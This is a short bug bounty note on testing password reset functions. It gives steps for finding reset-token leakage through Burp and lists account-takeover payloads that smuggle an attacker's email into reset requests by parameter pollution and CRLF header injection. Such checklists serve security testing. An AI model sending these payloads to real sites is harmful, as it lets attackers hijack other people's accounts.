---
title: Password reset functionality
toc: true
date: 2021-04-14 14:14:26
tags: Summary
categories: [100 Cyber security, 110 Bug bounty, 112 Ideas]
---

Mindmap https://kathan19.gitbook.io/howtohunt/password-reset-functionality/password_reset_functionality
1. password reset token leakage
      1. Sent a password reset request using forget password
      2. Check your email
      3. Copy your reset page link and paste in another tab and make burp intercept on.
      4. Look for every request if you find similar token that is in reset link with other domain like: bat.bing.com or facebook.com
      5. Then there is reset password token leakage.
1. account takeover by password reset functionality
      1. email= victim@gmail.com&email=attacker@gmil.com
      2. email= victim@gmail.com%20email=attacker@gmil.com
      3. email= victim@gmail.com |email=attacker@gmil.com
      4. email= victim@gmail.com%0d%0acc:attacker@gmil.com
      5. email= victim@gmail.com&code= my password reset token
1. https://docs.google.com/presentation/d/1QzBl3k3n2q44ULyfZgr_gPZexj8nF5vD8JrS5AUJRbs/edit#slide=id.ga30203dab9_1_64
